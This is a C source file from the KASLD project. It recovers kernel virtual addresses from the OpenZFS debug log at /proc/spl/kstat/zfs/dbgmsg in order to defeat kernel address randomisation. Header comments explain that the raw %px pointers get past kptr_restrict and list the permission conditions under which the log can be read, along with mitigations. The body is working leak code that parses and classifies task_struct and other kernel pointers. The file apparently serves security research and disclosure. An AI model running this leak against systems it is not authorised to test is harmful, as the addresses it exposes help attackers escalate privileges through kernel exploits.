// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Recover kernel virtual addresses from the OpenZFS debug message log at
// /proc/spl/kstat/zfs/dbgmsg.
//
// OpenZFS (an out-of-tree filesystem, common on NAS / storage / root-on-ZFS
// systems) writes operational debug messages to a procfs ring buffer. Since
// commit a887d653b ("Restrict kstats and print real pointers", v0.8.0, 2019)
// the formatter prints REAL pointers with %px, and every message line is
// prefixed with the current task's address (commit 5caeef02f, 2023):
//
//   <timestamp>  <curthread> <file>:<line>:<func>(): <message>
//
//   %px curthread  -> the running task_struct kernel virtual address
//                     (slab-allocated -> direct-map region)
//   message bodies additionally print other %px pointers (e.g. RAID-Z
//   reconstruct rm=%px), occasionally including code/module pointers.
//
// Every hex run on each line is parsed and classified against the kernel
// virtual address windows; values that land in a window are emitted, others
// (timestamps, counts, hardware values) are dropped.
//
// Because the disclosure uses %px (raw), it is NOT affected by
// kernel.kptr_restrict, which sanitises only %pK. The pointer is printed
// in full at ANY kptr_restrict level, so this survives the hardened profile
// (kptr_restrict=2) where %pK-based and kallsyms paths are masked.
// The only gate is the file's permission.
//
// Leak primitive:
//   Data leaked:      kernel virtual addresses (task_struct curthread; occas.
//                     text/module/vmalloc pointers from message bodies)
//   Kernel subsystem: OpenZFS SPL debug log (module/os/linux/zfs/zfs_debug.c)
//   Data structure:   zfs_dbgmsgs procfs_list ring buffer
//   Address type:     virtual (direct-map; sometimes text / module / vmalloc)
//   Method:           parsed (procfs read)
//   Status:           unfixed by design (debug log prints real pointers)
//   Access check:     procfs file permission only — NOT kptr_restrict
//
// Default exposure:
//   /proc/spl/kstat/zfs/dbgmsg is mode 0600 (root-only) since v0.8.0; the
//   raw-%px and 0600-restriction were introduced together, by design. This
//   component fires when that gate is relaxed in practice:
//   - ancient ZFS (< 0.8.0 / pre-2019) where the kstat default was 0644;
//   - admin chmod / ACL / tmpfiles rule loosening it for a monitoring or
//     support-collection service account (ZFS docs point users at dbgmsg);
//   - a debugging session left world-readable.
//
// Mitigations:
//   Keep /proc/spl/kstat/zfs/dbgmsg mode 0600 (the default). Unloading the
//   zfs module removes the source. No runtime sysctl affects %px.
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Parses kernel virtual addresses from the OpenZFS debug log at "
    "/proc/spl/kstat/zfs/dbgmsg. Each message line is prefixed with the "
    "running task_struct address, printed with %px (a raw, unhashed "
    "pointer), and message bodies print further %px pointers. Because the "
    "disclosure is %px rather than %pK, it is unaffected by "
    "kernel.kptr_restrict and survives even kptr_restrict=2. The log is "
    "mode 0600 by default (since ZFS 0.8.0); this fires on ancient ZFS that "
    "defaulted to 0644, or where an admin relaxed the permission for "
    "monitoring/diagnostics.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "config:CONFIG_ZFS\n"
           "note:bypasses_kptr_restrict\n");

#define DBGMSG_PATH "/proc/spl/kstat/zfs/dbgmsg"
#define SEEN_MAX 256

/* Already-emitted values, so a curthread repeated on every line is reported
 * once. */
static unsigned long g_seen[SEEN_MAX];
static int g_nseen;

static int already_seen(unsigned long v) {
  for (int i = 0; i < g_nseen; i++)
    if (g_seen[i] == v)
      return 1;
  if (g_nseen < SEEN_MAX)
    g_seen[g_nseen++] = v;
  return 0;
}

/* Classify a kernel-VAS address into a region and emit it. Virtual-text ranks
 * highest (symbol-grade); direct-map is the typical curthread case. */
static int emit_addr(unsigned long addr) {
  enum kasld_region region;
  if (kasld_addr_is_kernel_text(addr))
    region = REGION_KERNEL_TEXT;
  else if (kasld_addr_is_module_region(addr))
    region = REGION_MODULE_REGION;
  else if (kasld_addr_is_directmap(addr))
    region = REGION_DIRECTMAP;
  else if (kasld_addr_is_kernel_vas(addr))
    region = REGION_VMALLOC; /* in kernel VAS, not text/module/direct-map */
  else
    return 0; /* not a kernel virtual address — drop */

  kasld_info("dbgmsg leaked kernel pointer: 0x%lx (%s)", addr,
             kasld_region_wire(region));
  kasld_result_sample(KASLD_TYPE_VIRT, region, addr, NULL, CONF_PARSED);
  return 1;
}

/* Scan one log line for maximal hex runs (optionally 0x-prefixed) of
 * pointer width, parse each, and emit those inside a kernel window. The window
 * test rejects timestamps / counts / hardware values that are merely hex. */
static int scan_line(const char *line) {
  const char *p = line;
  int emitted = 0;
  while (*p) {
    if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X'))
      p += 2;
    if (!isxdigit((unsigned char)*p)) {
      p++;
      continue;
    }
    const char *start = p;
    while (isxdigit((unsigned char)*p))
      p++;
    size_t len = (size_t)(p - start);
    /* pointer width: 8 hex (32-bit) .. 16 hex (64-bit) */
    if (len >= 8 && len <= 16) {
      unsigned long v = strtoul(start, NULL, 16);
      if (v && !already_seen(v))
        emitted += emit_addr(v);
    }
  }
  return emitted;
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);

  FILE *f = kasld_fopen(DBGMSG_PATH, "r");
  if (!f) {
    if (errno == EACCES || errno == EPERM) {
      kasld_err("%s not readable (mode 0600 — the default since ZFS 0.8.0)",
                DBGMSG_PATH);
      return KASLD_EXIT_NOPERM;
    }
    return KASLD_EXIT_UNAVAILABLE; /* ZFS not loaded / no debug log */
  }

  kasld_info("scanning %s for kernel pointers (raw %%px — not kptr_restricted)",
             DBGMSG_PATH);

  char line[1024];
  int total = 0;
  while (fgets(line, sizeof(line), f))
    total += scan_line(line);
  fclose(f);

  if (!total)
    kasld_info("no kernel-VAS pointers found in %s (log empty or no entries)",
               DBGMSG_PATH);
  return 0;
}
